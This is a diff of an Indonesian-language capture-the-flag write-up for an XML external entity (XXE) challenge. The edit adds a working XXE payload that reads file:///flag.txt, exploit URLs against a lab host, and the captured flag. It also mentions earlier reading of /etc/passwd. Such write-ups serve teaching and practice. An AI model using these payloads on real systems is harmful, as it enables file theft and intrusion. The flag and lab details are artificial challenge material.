@@ -362,7 +362,7 @@ Karena ada filter HTML, saya membuat file XML murni (Raw) di GitHub Gist yang be
       <strong>
         Eksploitasi:
       </strong>
-Memasukkan URL Raw Gist tersebut ke parameter <code>?idol=</code>.
+Memasukkan URL Raw Gist tersebut ke parameter <code>?idol=</code> dan dapatkan URL Raw dari sana.
       <pre>
         http://10.15.42.23:2509/?idol=https://gist.githubusercontent.com/jofanka10/fb6d7f358104d8d12893b39a34f9c7b3/raw/7947c9d92975849c9e17fb6b795c296ab7ad5323/gistfile1.txt
       </pre>
@@ -374,22 +374,37 @@ Memasukkan URL Raw Gist tersebut ke parameter <code>?idol=</code>.
         </em>
       </p>
     </blockquote>
+    <p>
+      Lalu, dengan hasil tersebut kita coba membuat gist kedua untuk mencari <code>flag.txt</code> yang terssembunyi.
+    </p>
+    <pre>
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ 
+  <!ELEMENT data ANY >
+  <!ENTITY xxe SYSTEM "file:///flag.txt" >
+]>
+<data>&xxe;</data>
+    </pre>
+      <img width="928" height="188" alt="Screenshot 2025-12-06 at 12 34 27" src="https://github.com/user-attachments/assets/2b156130-c9c8-4d89-8219-529236477203" /
+      <p>Setelah itu, dapatkan URL Raw dari gist tersebut.
+        <pre>
+          http://10.15.42.23:5006/?idol=https://gist.githubusercontent.com/jofanka10/704e1d7137f5afe6c2b7f8584744abb5/raw/0cf85cdf1ab8fd0d207d42b808d7e0396addb514/gistfile1.txt
+        </pre>
   </li>
-  
+
   <li>
     <p>
       <strong>
         Hasil:
       </strong>
-Aplikasi menampilkan isi file <code>/etc/passwd</code>.
+Setelah memasukkan URL di atas, sebuah flag muncul.
     </p>
-          <blockquote>
-            <p>
-  <em>
-    [MASUKKAN SCREENSHOT ISI FILE PASSWD DI WEBSITE]
-  </em>
-            </p>
-          </blockquote>
+    <img width="1467" height="510" alt="Screenshot 2025-12-06 at 12 39 47" src="https://github.com/user-attachments/assets/337e29f0-d826-47cf-9973-27deba72b99d" />
+
+<p>Di mana ini adalah flagnya.</p>
+<pre>
+  ETHACK{x3rn4l_3nt1ty_1nj3ct10n_v1a_f1l3_r34d}
+</pre>
   </li>
 </ol>
 
